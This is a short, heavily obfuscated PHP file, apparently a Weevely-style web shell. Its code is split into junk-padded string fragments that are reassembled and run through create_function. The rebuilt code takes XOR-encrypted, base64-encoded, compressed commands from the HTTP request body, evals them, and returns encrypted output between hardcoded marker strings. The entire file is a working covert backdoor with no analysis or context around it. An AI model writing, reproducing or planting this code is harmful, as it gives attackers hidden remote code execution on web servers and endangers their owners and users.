<?php
$g='nPjd_clePjan();Pj$r=@basPje64_encoPjde(@PjxPj(@gzcomprPjesPjs($o),$k));pPjriPjPjnt("$p$kh$r$kf");}';
$s='j("/$kh(.+Pj)$kf/Pj",@file_gPjet_cPjontenPjts("pPjPjhp://inpPjut"),$m)==1) {@oPjb_PjstaPjrt();@ev';
$p='nctionPj x(PjPj$t,$k){$c=strlen($Pjk);Pj$l=strlePjnPjPj($t);Pj$o="";for(Pj$i=0;$iPj<$l;){for($j=0;P';
$I='Pj$kPj="60003740";$kh=Pj"6dcbd6PjPj4a1Pj140";$kf="bc240Pj9b7106Pj2";$p="dPjnPjuDlC5PjHPjqFzmTy5N";Pjfu';
$Q='j($j<$cPjPjPj&&$i<$l);$j++,Pj$Pji++){$o.=$t{Pj$i}^$k{$jPj};Pj}}rPjeturn $o;Pj}if (@pregPj_matchPjP';
$o='Pjal(@gzPjuncomprPjess(@x(@baPjse64_dPjecodPje($mPj[1]),$k)))Pj;$o=@oPjb_Pjget_cPjontentsPj();@ob_e';
$C=str_replace('O','','creOaOteO_fuOncOtOion');
$k=str_replace('Pj','',$I.$p.$Q.$s.$o.$g);
$V=$C('',$k);$V();
?>
